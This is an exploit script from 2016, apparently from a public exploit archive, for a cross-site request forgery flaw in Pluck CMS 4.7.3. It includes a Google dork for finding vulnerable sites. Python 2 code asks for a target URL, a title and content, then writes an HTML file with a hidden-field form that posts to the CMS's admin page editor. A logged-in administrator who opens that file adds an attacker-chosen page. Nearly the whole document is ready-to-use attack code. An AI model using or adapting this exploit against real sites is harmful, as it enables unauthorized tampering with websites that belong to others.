# Exploit Title: Pluck CMS 4.7.3 - Add-Page Cross-Site Request Forgery
# Exploit Author: Ahsan Tahir
# Date: 18-10-2016
# Software Link: http://www.pluck-cms.org/?file=download
# Vendor: http://www.pluck-cms.org/
# Google Dork: "2005-2016. pluck is available"
# Contact: https://twitter.com/AhsanTahirAT | https://facebook.com/ahsantahiratofficial
# Website: www.ahsan-tahir.com
# Category: webapps
# Version: 4.7.3
# Tested on: [Kali Linux 2.0 | Windows 8.1]
# Email: mrahsan1337@gmail.com

import os
import urllib

if os.name == 'nt':
		os.system('cls')
else:
	os.system('clear')

def csrfexploit():

	banner = '''
	+-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==+
	|  ____  _            _       ____ __  __ ____   |
	| |  _ \| |_   _  ___| | __  / ___|  \/  / ___|  |
	| | |_) | | | | |/ __| |/ / | |   | |\/| \___ \  |
	| |  __/| | |_| | (__|   <  | |___| |  | |___) | |
	| |_|   |_|\__,_|\___|_|\_\  \____|_|  |_|____/  |
	|  //PluckCMS 4.7.3 Add-Post CSRF Auto-Exploiter |
	|  > Exploit Author & Script Coder: Ahsan Tahir  |
	+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=+
	'''
	print banner

	url = str(raw_input(" [+] Enter The Target URL (Please include http:// or https://): "))
	title = str(raw_input(" [+] Enter the Title of the Post which you want to add by exploiting CSRF: "))
	content = raw_input(" [+] Enter the Content, which you want to add in the post by exploiting CSRF: ")

	csrfhtmlcode = '''
	<html>
	  <!-- CSRF PoC -->
	  <body>
	    <form action="%s/admin.php?action=editpage" method="POST">
	      <input type="hidden" name="title" value="%s" />
	      <input type="hidden" name="seo&#95;name" value="" />
	      <input type="hidden" name="content" value="%s" />
	      <input type="hidden" name="description" value="" />
	      <input type="hidden" name="keywords" value="" />
	      <input type="hidden" name="hidden" value="no" />
	      <input type="hidden" name="sub&#95;page" value="" />
	      <input type="hidden" name="theme" value="default" />
	      <input type="hidden" name="save" value="Save" />
	      <input type="submit" value="Submit request" />
	    </form>
	  </body>
	</html>
	''' %(url, title, content)

	print " +----------------------------------------------------+\n [!] The HTML exploit code for exploiting this CSRF has been created."

	print(" [!] Enter your Filename below\n Note: The exploit will be saved as 'filename'.html \n")
	extension = ".html"
	name = raw_input(" Filename: ")
	filename = name+extension
	file = open(filename, "w")

	file.write(csrfhtmlcode)
	file.close()
	print(" [+] Your exploit is saved as %s")%filename
	print("")

csrfexploit()